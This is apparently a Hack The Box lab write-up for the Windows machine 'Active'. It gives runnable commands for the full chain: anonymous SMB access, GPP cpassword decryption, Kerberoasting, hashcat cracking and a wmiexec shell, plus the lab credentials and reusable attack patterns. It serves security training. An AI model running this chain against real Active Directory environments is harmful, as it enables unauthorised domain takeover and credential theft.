
# MACHINE: Active

# PLATFORM: HTB

# OS: Windows

# CATEGORY: Active Directory

# DIFFICULTY: Easy

## TAGS

active-directory
windows
smb
smb-anon
ldap
kerberos
gpp
kerberoast
impacket
hashcat
wmiexec
easy

---

## SUMMARY

Active is a Windows Active Directory machine where anonymous SMB access exposes policy files containing Group Policy Preferences credentials. Those credentials provide a valid domain account, which is then used to enumerate SPNs and perform Kerberoasting. Cracking the Kerberos TGS hash recovers Administrator credentials, allowing remote command execution over WMI.

---

## TARGET PROFILE

### SERVICES OBSERVED

* 88/tcp kerberos
* 135/tcp msrpc
* 139/tcp netbios-ssn
* 389/tcp ldap
* 445/tcp microsoft-ds
* 464/tcp kpasswd
* 593/tcp ncacn_http
* 636/tcp ldaps
* 3268/tcp global catalog ldap
* 3269/tcp global catalog ldaps

### HOST CHARACTERISTICS

* Domain Controller behavior observed
* Active Directory environment confirmed
* SMB accessible
* LDAP accessible
* Kerberos accessible

---

## INITIAL ENUMERATION

### NMAP

```bash
sudo nmap -Pn -p- -T4 -sS -sV -sC \
  --script "default,vuln,smb-vuln*,ftp-anon,ftp-syst,ftp-bounce,http-methods,http-enum,http-webdav-scan" \
  --script-timeout 20s --max-retries 2 \
  -oA nmap_full <target>
```

### AUTORECON

```bash
autorecon <target> \
-m 100 \
-mp 20 \
-o autorecon_vm3 \
--dirbuster.tool feroxbuster \
--dirbuster.threads 50 \
-v
```

### KEY FINDINGS

* Target appears to be a Domain Controller
* No initial credentials available
* SMB is the best early attack surface
* LDAP and Kerberos likely become useful after obtaining valid creds

---

## INITIAL ACCESS

### METHOD

smb anonymous access → GPP credential extraction

### DECISION LOGIC

IF:

* SMB allows anonymous share listing
* A replication or SYSVOL-like share is readable

THEN:

* Search for policy files
* Look for Groups.xml or similar
* Attempt GPP cpassword extraction

### STEPS

#### 1. Enumerate SMB Shares Anonymously

```bash
smbclient -L //<target> -N
```

#### 2. Access Replication Share

```bash
smbclient //<target>/Replication -N
```

#### 3. Locate Groups.xml

Target path observed:

```text
/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```

#### 4. Extract and Decrypt cpassword

```bash
gpp-decrypt "$(grep -oP 'cpassword="\K[^"]+' ./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml)"
```

### CREDENTIALS OBTAINED

```text
SVC_TGS : GPPstillStandingStrong2k18
```

### RESULT

Valid domain credentials recovered from GPP.

### REFERENCED PATTERNS

* patterns/smb-anon.md
* patterns/gpp.md

---

## POST-CREDENTIAL ENUMERATION

### METHOD

authenticated SMB and LDAP enumeration

### DECISION LOGIC

IF:

* Valid domain credentials obtained

THEN:

* Re-enumerate shares
* Attempt LDAP user enumeration
* Identify service accounts and privileged users
* Prepare for Kerberoasting

### SMB RE-ENUMERATION

```bash
smbclient -L //<target> -U SVC_TGS
```

### RESULT

Additional access obtained, including access into user-related shares.

### USER FLAG

User flag recovered after authenticated access to user directories.

---

## LDAP ENUMERATION

### OBJECTIVE

Identify active users and confirm viable Kerberoast targets.

### COMMAND

```bash
ldapsearch -x -H ldap://<target> \
-D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' \
-b "dc=active,dc=htb" \
-s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" \
samaccountname | grep sAMAccountName
```

### FINDINGS

* Administrator account active
* SVC_TGS account valid
* Domain user enumeration successful

---

## PRIVILEGE ESCALATION

### METHOD

Kerberoasting

### DECISION LOGIC

IF:

* Valid domain user credentials are available
* SPNs are present in the domain

THEN:

* Enumerate SPNs
* Request TGS tickets
* Crack offline
* Reuse recovered credentials for remote execution

### ENUMERATE SPNS

```bash
GetUserSPNs.py active.htb/svc_tgs:'GPPstillStandingStrong2k18' -dc-ip <target>
```

### REQUEST SERVICE TICKET

```bash
GetUserSPNs.py active.htb/svc_tgs:'GPPstillStandingStrong2k18' -dc-ip <target> -request
```

### RESULT

Kerberos TGS hash obtained for offline cracking.

### CRACK HASH

```bash
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force
```

### CREDENTIALS OBTAINED

```text
Administrator : Ticketmaster1968
```

### REFERENCED PATTERNS

* patterns/kerberoast.md

---

## EXECUTION

### METHOD

WMI remote execution

### COMMAND

```bash
wmiexec.py active.htb/administrator:Ticketmaster1968@<target>
```

### RESULT

Administrative remote shell obtained.

---

## ROOT / FINAL ACCESS

### OUTCOME

Administrator-level compromise achieved.

### ROOT FLAG

Recovered from the Administrator desktop after remote access.

---

## CREDENTIALS CHAIN

```text
SVC_TGS : GPPstillStandingStrong2k18
Administrator : Ticketmaster1968
```

---

## ATTACK CHAIN

1. Enumerate exposed services
2. Identify Domain Controller characteristics
3. Test SMB anonymous access
4. Access Replication share anonymously
5. Locate Groups.xml
6. Extract and decrypt GPP cpassword
7. Obtain SVC_TGS credentials
8. Re-enumerate with authenticated access
9. Query LDAP for active users
10. Enumerate SPNs
11. Request Kerberos service ticket
12. Crack Kerberoast hash offline
13. Recover Administrator credentials
14. Execute commands remotely with wmiexec
15. Obtain full compromise

---

## REUSABLE LOGIC

### PATTERN 1

IF:

* SMB anonymous access works
* SYSVOL or Replication is readable

THEN:

* Search for GPP credentials immediately

### PATTERN 2

IF:

* Domain user credentials are recovered

THEN:

* Check for SPNs and attempt Kerberoasting

### PATTERN 3

IF:

* Administrator or equivalent credentials are recovered

THEN:

* Attempt WMI / PSExec / WinRM for shell access

---

## TOOLING USED

* nmap
* autorecon
* smbclient
* gpp-decrypt
* ldapsearch
* GetUserSPNs.py
* hashcat
* wmiexec.py

---

## OPERATOR NOTES

* This machine is an example of a classic AD misconfiguration chain
* The initial foothold does not require credentials
* GPP exposure is the pivot that unlocks domain-level attack paths
* Kerberoasting remains highly effective when service passwords are weak
* This box is a strong reference case for:

  * anonymous SMB enumeration
  * GPP credential extraction
  * Kerberoasting
  * credential chaining in AD

---
